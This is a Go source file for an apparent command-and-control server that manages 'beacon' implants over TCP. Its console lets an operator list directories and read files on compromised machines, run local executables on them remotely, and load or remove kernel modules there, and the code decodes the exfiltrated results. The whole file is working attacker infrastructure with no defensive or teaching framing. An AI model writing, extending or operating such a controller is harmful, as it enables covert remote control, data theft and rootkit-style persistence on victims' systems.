package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/desertbit/grumble"
)

const (
	DT_UNKNOWN = 0
	DT_FIFO    = 1
	DT_CHR     = 2
	DT_DIR     = 4
	DT_BLK     = 6
	DT_REG     = 8
	DT_LNK     = 10
	DT_SOCK    = 12
	DT_WHT     = 14
)

var app *grumble.App
var beaconManager BeaconManager

func handleConnection(conn net.Conn) {
	// responsePacket := Packet{}
	packet := Packet{}
	packet.recvPacket(conn)

	command_id := packet.packet_get_uint32()
	interval := packet.packet_get_uint32()
	jitter := packet.packet_get_uint32()
	beaconID := packet.packet_get_uint32()

	beacon := &Beacon{
		beaconID:         beaconID,
		jitter:           jitter,
		interval:         interval,
		ip:               strings.Split(conn.RemoteAddr().String(), ":")[0],
		last_access_time: time.Now().Unix(),
	}

	if beaconManager.addBeacon(*beacon) {
		app.Println("\nnew Beacon online\n")
	}

	beacon = beaconManager.findBeacon(beaconID)

	for packet.length != packet.size {
		command_id = packet.packet_get_uint32()
		switch command_id {
		case COMMAND_LS:
			total_packet_len := packet.packet_get_uint32()
			target_path_len := packet.packet_get_uint32()
			target_path := string(packet.packet_get_bytes(int(target_path_len)))
			commandResult := packet.packet_get_uint32()

			if commandResult != 0 {
				app.Println(fmt.Sprintf("\ncommand ls execute error(target path:%s , beaconID:%d)\n", target_path, beaconID))
				break
			}

			app.Println(fmt.Sprintf("\ncommand ls execute success(target path:%s , beaconID:%d)\n", target_path, beaconID))
			buff_len := total_packet_len - 4 - target_path_len - 4
			buf := packet.packet_get_bytes(int(buff_len))
			buf_idx := 0
			out := ""

			for len(buf) != buf_idx {
				dir_len := int(binary.BigEndian.Uint16(buf[buf_idx : buf_idx+2]))
				buf_idx += 2
				dir_type := int(binary.BigEndian.Uint16(buf[buf_idx : buf_idx+2]))
				buf_idx += 2
				dir_name := string(buf[buf_idx : buf_idx+dir_len])
				buf_idx += int(dir_len)
				switch dir_type {
				case DT_DIR:
					dir_name = dir_name + "/"
				}
				out = out + dir_name + "\n"
			}
			app.Println(fmt.Sprintf("\n%s\n", out))
		case COMMAND_CAT:
			_ = packet.packet_get_uint32() // total_packet_len
			target_path_len := packet.packet_get_uint32()
			target_path := string(packet.packet_get_bytes(int(target_path_len)))
			commandResult := packet.packet_get_uint32()

			if commandResult != 0 {
				app.Println(fmt.Sprintf("\ncommand cat execute error(target path:%s , beaconID:%d)\n", target_path, beaconID))
				break
			}

			file_size := packet.packet_get_uint32()
			app.Println(fmt.Sprintf("\ncommand cat execute success(target path:%s , beaconID:%d , file size:%d)\n", target_path, beaconID, file_size))
			if file_size == 0 {
				break
			}
			file_content := string(packet.packet_get_bytes(int(file_size)))
			app.Println(fmt.Sprintf("\n%s\n", file_content))
		case COMMAND_EXEC:
			_ = packet.packet_get_uint32() // total_packet_len
			exec_name_len := packet.packet_get_uint32()
			exec_name := string(packet.packet_get_bytes(int(exec_name_len)))
			commandResult := packet.packet_get_uint32()

			if commandResult != 0 {
				app.Println(fmt.Sprintf("\ncommand exec execute error(exe name:%s , beaconID:%d)\n", exec_name, beaconID))
				break
			}
			app.Println(fmt.Sprintf("\ncommand exec execute success(exe name:%s , beaconID:%d)\n", exec_name, beaconID))
		case COMMAND_INSMOD:
			_ = packet.packet_get_uint32() // total_packet_len
			mod_name_len := packet.packet_get_uint32()
			mod_name := string(packet.packet_get_bytes(int(mod_name_len)))
			errcode := packet.packet_get_uint32()
			err_strlen := packet.packet_get_uint32()
			err_str := ""

			if err_strlen != 0 {
				err_str = string(packet.packet_get_bytes(int(err_strlen)))
			} else {
				err_str = ""
			}

			if errcode != 0 && err_strlen == 0 {
				app.Println(fmt.Sprintf("\ncommand insmod execute failed(module name:%s , beaconID:%d , errcode:%d)\n", mod_name, beaconID, errcode))
			} else if errcode != 0 && err_strlen != 0 {
				app.Println(fmt.Sprintf("\ncommand insmod execute failed(module name:%s , beaconID:%d , errcode:%d , err str:%s)\n", mod_name, beaconID, errcode, err_str))
			} else if errcode == 0 {
				app.Println(fmt.Sprintf("\ncommand insmod execute success(module name:%s , beaconID:%d , errcode:%d)\n", mod_name, beaconID, errcode))
			}
		case COMMAND_RMMOD:
			_ = packet.packet_get_uint32() // total_packet_len
			mod_name_len := packet.packet_get_uint32()
			mod_name := string(packet.packet_get_bytes(int(mod_name_len)))
			errcode := packet.packet_get_uint32()
			err_strlen := packet.packet_get_uint32()
			err_str := ""

			if err_strlen != 0 {
				err_str = string(packet.packet_get_bytes(int(err_strlen)))
			} else {
				err_str = ""
			}

			if errcode != 0 && err_strlen == 0 {
				app.Println(fmt.Sprintf("\ncommand rmmod execute failed(module name:%s , beaconID:%d , errcode:%d)\n", mod_name, beaconID, errcode))
			} else if errcode != 0 && err_strlen != 0 {
				app.Println(fmt.Sprintf("\ncommand rmmod execute failed(module name:%s , beaconID:%d , errcode:%d , err str:%s)\n", mod_name, beaconID, errcode, err_str))
			} else if errcode == 0 {
				app.Println(fmt.Sprintf("\ncommand rmmod execute success(module name:%s , beaconID:%d , errcode:%d)\n", mod_name, beaconID, errcode))
			}
		case COMMAND_MODINFO:
			_ = packet.packet_get_uint32() // total_packet_len
			mod_name_len := packet.packet_get_uint32()
			mod_name := string(packet.packet_get_bytes(int(mod_name_len)))
			errcode := packet.packet_get_uint32()
			err_str := ""

			if errcode != 0 {
				err_strlen := packet.packet_get_uint32()
				if err_strlen != 0 {
					err_str = string(packet.packet_get_bytes(int(err_strlen)))
					app.Println(fmt.Sprintf("\ncommand modinfo execute failed(module name:%s , beaconID:%d , errcode:%d , err str:%s)\n", mod_name, beaconID, errcode, err_str))
				} else {
					app.Println(fmt.Sprintf("\ncommand modinfo execute failed(module name:%s , beaconID:%d , errcode:%d)\n", mod_name, beaconID, errcode))
				}
			} else {
				out := ""
				mod_desc_len := packet.packet_get_uint32()
				mod_desc := string(packet.packet_get_bytes(int(mod_desc_len)))
				out = fmt.Sprintf("description:\t%s", mod_desc)

				params_data_len := packet.packet_get_uint32()
				params_data := packet.packet_get_bytes(int(params_data_len))

				for i := 0; i < int(params_data_len); {
					params_option_len := int(binary.BigEndian.Uint32(params_data[i : i+4]))
					i += 4
					params_option := string(params_data[i : i+params_option_len])
					i += params_option_len

					params_name_len := int(binary.BigEndian.Uint32(params_data[i : i+4]))
					i += 4
					params_name := string(params_data[i : i+params_name_len])
					i += params_name_len

					params_desc_len := int(binary.BigEndian.Uint32(params_data[i : i+4]))
					i += 4
					params_desc := string(params_data[i : i+params_desc_len])
					i += params_desc_len

					out = fmt.Sprintf("%s\nparam:\t%s %s\t%s", out, params_option, params_name, params_desc)

				}

				app.Println(fmt.Sprintf("\ncommand modinfo execute success(module name:%s , beaconID:%d , errcode:%d)\n\n%s\n", mod_name, beaconID, errcode, out))
			}
		case COMMAND_LSMOD:
			_ = packet.packet_get_uint32() // total_packet_len
			all_mod_name_len := packet.packet_get_uint32()
			all_mod_name := ""
			if all_mod_name_len == 0 {
				all_mod_name = ""
			} else {
				all_mod_name = string(packet.packet_get_bytes(int(all_mod_name_len)))
			}

			app.Println(fmt.Sprintf("\ncommand lsmod execute success(beaconID:%d)\n\n%s\n", beaconID, all_mod_name))
		case COMMAND_DMESG:
			_ = packet.packet_get_uint32() // total_packet_len
			mesg_len := packet.packet_get_uint32()
			mesg_str := string(packet.packet_get_bytes(int(mesg_len)))

			beacon.dmesg_buf = beacon.dmesg_buf + mesg_str

		default:
			fmt.Println("\nunknow command id: %d\n", command_id)
		}
	}

	beacon = beaconManager.findBeacon(beaconID)
	beacon.mutex.Lock()
	if beacon.packet != nil {
		beacon.packet.sendPacket(conn)
		beacon.packet = nil
	} else {
		noJobPacket := commandNoJobPacket()
		noJobPacket.sendPacket(conn)
	}
	beacon.mutex.Unlock()

	conn.Close()
}

func startTcpListen() {
	listener, err := net.Listen("tcp", "127.0.0.1:2333")
	if err != nil {
		app.Println("\nError listening:", err)
		return
	}
	defer listener.Close()

	app.Println("\nServer is listening on port 2333...\n")

	for {
		conn, err := listener.Accept()
		if err != nil {
			app.Println("\nError accepting connection:", err)
			continue
		}

		go handleConnection(conn)
	}

}

func main() {
	app = grumble.New(&grumble.Config{
		Name:        "console",
		Description: "short app description",

		Flags: func(f *grumble.Flags) {
			f.String("d", "directory", "DEFAULT", "set an alternative directory path")
			f.Bool("v", "verbose", false, "enable verbose mode")
		},
	})

	app.AddCommand(&grumble.Command{
		Name: "list",
		Help: "list the beacon",

		Run: func(c *grumble.Context) error {
			beaconList := beaconManager.listBeacons()

			for _, value := range beaconList {
				c.App.Println(value)
			}
			return nil
		},
	})

	app.AddCommand(&grumble.Command{
		Name: "ls",
		Help: "ls beacon path",

		Args: func(a *grumble.Args) {
			a.String("beaconID", "beacon to ls directory", grumble.Default("0"))
			a.String("path", "beacon computer directory", grumble.Default("/"))
		},

		Run: func(c *grumble.Context) error {
			beaconIDStr := c.Args.String("beaconID")
			path := c.Args.String("path")

			beaconID, err := strconv.ParseInt(beaconIDStr, 10, 64)
			if err != nil {
				return errors.New("unknow beaconID")
			}

			beacon := beaconManager.findBeacon(uint32(beaconID))
			if beacon == nil {
				return errors.New("unknow beaconID")
			}

			beacon.addCommandLs(path)
			return nil
		},
	})

	app.AddCommand(&grumble.Command{
		Name: "cat",
		Help: "cat beacon file",

		Args: func(a *grumble.Args) {
			a.String("beaconID", "beacon id", grumble.Default("0"))
			a.String("path", "target file path to read", grumble.Default("/"))
		},

		Run: func(c *grumble.Context) error {
			beaconIDStr := c.Args.String("beaconID")
			path := c.Args.String("path")

			beaconID, err := strconv.ParseInt(beaconIDStr, 10, 64)
			if err != nil {
				return errors.New("unknow beaconID")
			}

			beacon := beaconManager.findBeacon(uint32(beaconID))
			if beacon == nil {
				return errors.New("unknow beaconID")
			}

			beacon.addCommandCat(path)
			return nil
		},
	})

	app.AddCommand(&grumble.Command{
		Name: "exec",
		Help: "exec local exec to beacon",

		Args: func(a *grumble.Args) {
			a.String("beaconID", "beacon id", grumble.Default("0"))
			a.String("path", "local exec path to run on remote pc", grumble.Default("/"))
		},

		Run: func(c *grumble.Context) error {
			beaconIDStr := c.Args.String("beaconID")
			path := c.Args.String("path")

			beaconID, err := strconv.ParseInt(beaconIDStr, 10, 64)
			if err != nil {
				return errors.New("unknow beaconID")
			}

			beacon := beaconManager.findBeacon(uint32(beaconID))
			if beacon == nil {
				return errors.New("unknow beaconID")
			}

			return beacon.addCommandExec(path)
		},
	})

	app.AddCommand(&grumble.Command{
		Name: "insmod",
		Help: "insmod module to beacon",

		Args: func(a *grumble.Args) {
			a.String("beaconID", "beacon id", grumble.Default("0"))
			a.String("path", "local module path to insert to beacon", grumble.Default("/"))
		},

		Run: func(c *grumble.Context) error {
			beaconIDStr := c.Args.String("beaconID")
			path := c.Args.String("path")

			beaconID, err := strconv.ParseInt(beaconIDStr, 10, 64)
			if err != nil {
				return errors.New("unknow beaconID")
			}

			beacon := beaconManager.findBeacon(uint32(beaconID))
			if beacon == nil {
				return errors.New("unknow beaconID")
			}

			return beacon.addCommandInsmod(path)
		},
	})

	app.AddCommand(&grumble.Command{
		Name: "rmmod",
		Help: "rmmod module in beacon",

		Args: func(a *grumble.Args) {
			a.String("beaconID", "beacon id", grumble.Default("0"))
			a.String("moduleName", "module name", grumble.Default("/"))
		},

		Run: func(c *grumble.Context) error {
			beaconIDStr := c.Args.String("beaconID")
			moduleName := c.Args.String("moduleName")

			beaconID, err := strconv.ParseInt(beaconIDStr, 10, 64)
			if err != nil {
				return errors.New("unknow beaconID")
			}

			beacon := beaconManager.findBeacon(uint32(beaconID))
			if beacon == nil {
				return errors.New("unknow beaconID")
			}

			return beacon.addCommandRmmod(moduleName)
		},
	})

	app.AddCommand(&grumble.Command{
		Name: "lsmod",
		Help: "list all module in beacon",

		Args: func(a *grumble.Args) {
			a.String("beaconID", "beacon id", grumble.Default("0"))
		},

		Run: func(c *grumble.Context) error {
			beaconIDStr := c.Args.String("beaconID")

			beaconID, err := strconv.ParseInt(beaconIDStr, 10, 64)
			if err != nil {
				return errors.New("unknow beaconID")
			}

			beacon := beaconManager.findBeacon(uint32(beaconID))
			if beacon == nil {
				return errors.New("unknow beaconID")
			}

			return beacon.addCommandLsmod()
		},
	})
	app.AddCommand(&grumble.Command{
		Name: "modinfo",
		Help: "show module info",

		Args: func(a *grumble.Args) {
			a.String("beaconID", "beacon id", grumble.Default("0"))
			a.String("moduleName", "module name", grumble.Default("/"))
		},

		Run: func(c *grumble.Context) error {
			beaconIDStr := c.Args.String("beaconID")
			moduleName := c.Args.String("moduleName")

			beaconID, err := strconv.ParseInt(beaconIDStr, 10, 64)
			if err != nil {
				return errors.New("unknow beaconID")
			}

			beacon := beaconManager.findBeacon(uint32(beaconID))
			if beacon == nil {
				return errors.New("unknow beaconID")
			}

			return beacon.addCommandModinfo(moduleName)
		},
	})
	app.AddCommand(&grumble.Command{
		Name: "dmesg",
		Help: "display beacon module output message",

		Args: func(a *grumble.Args) {
			a.String("beaconID", "beacon id", grumble.Default("0"))
		},

		Run: func(c *grumble.Context) error {
			beaconIDStr := c.Args.String("beaconID")

			beaconID, err := strconv.ParseInt(beaconIDStr, 10, 64)
			if err != nil {
				return errors.New("unknow beaconID")
			}

			beacon := beaconManager.findBeacon(uint32(beaconID))
			if beacon == nil {
				return errors.New("unknow beaconID")
			}
			app.Println(fmt.Sprintf("\n%s\n", beacon.dmesg_buf))
			return nil
		},
	})

	go startTcpListen()
	grumble.Main(app)
}
